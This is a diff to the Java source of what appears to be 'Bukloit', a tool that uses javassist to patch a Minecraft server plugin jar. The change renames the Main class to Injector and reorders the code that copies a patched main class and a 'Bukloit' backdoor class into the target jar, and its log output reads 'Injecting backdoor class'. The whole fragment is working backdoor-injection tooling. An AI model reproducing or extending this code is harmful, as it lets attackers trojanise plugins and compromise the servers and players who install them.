@@ -27,7 +27,7 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 
-public class Main {
+public class Injector {
 	private static String key = "-opme";
 	private static int SU = 0;
 	private static int SK = 0;
@@ -144,11 +144,12 @@ public class Main {
 	        	    
 	        	    Path patched = Paths.get("temp/" + MAIN.replace(".", "/") + ".class");
 	        	    
-	        	    InputStream hackAPI = IOHelper.class.getResourceAsStream("/bukloit/Bukloit.class");
 	        	    FileSystem outStream = FileSystems.newFileSystem(out, null);
 	        	    Path targetCLASS = outStream.getPath("/" + MAIN.replace(".", "/") + ".class");
 	            	Logger.info("║ Injecting patched class...");
 	                Files.copy(patched, targetCLASS, StandardCopyOption.REPLACE_EXISTING);
+	                
+	        	    InputStream hackAPI = IOHelper.class.getResourceAsStream("/bukloit/Bukloit.class");
 	                Path targetAPICLASS = outStream.getPath("/bukloit/Bukloit.class");
 	                Files.createDirectory(outStream.getPath("/bukloit"));
 	            	Logger.info("║ Injecting backdoor class...");
